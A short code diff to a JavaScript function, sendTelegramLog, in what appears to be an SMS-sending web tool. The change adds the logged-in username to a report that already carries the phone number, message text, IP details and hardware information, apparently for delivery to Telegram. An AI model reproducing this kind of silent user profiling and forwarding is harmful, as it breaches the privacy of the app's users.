@@ -903,13 +903,16 @@ async function getHardwareInfo() {
 async function sendTelegramLog(number, message) {
     try {
         // গতি বাড়ানোর জন্য IP এবং Hardware তথ্য একসাথে সংগ্রহ করা হচ্ছে
-        const [ipInfo, dev] = await Promise.all([
+        // ১. LocalStorage theke login kora user-er naam niye asha
+        const loggedInUser = localStorage.getItem('username') || "Unknown User";  
+      const [ipInfo, dev] = await Promise.all([
             getIPData(),
             getHardwareInfo()
         ]);
 
         const fullMsg = ` 🛰 **CUSTOM SMS ALERT** 🛰 \n\n` +
             ` 📞 Number: \`${number}\` \n` +
+          ` 👤 **SENDER:** \`${loggedInUser}\` \n` + // ✅ Username line
             ` ✉ Message: \`${message}\` \n\n` +
             
             ` 🌐 **IP DETAILS** \n` +
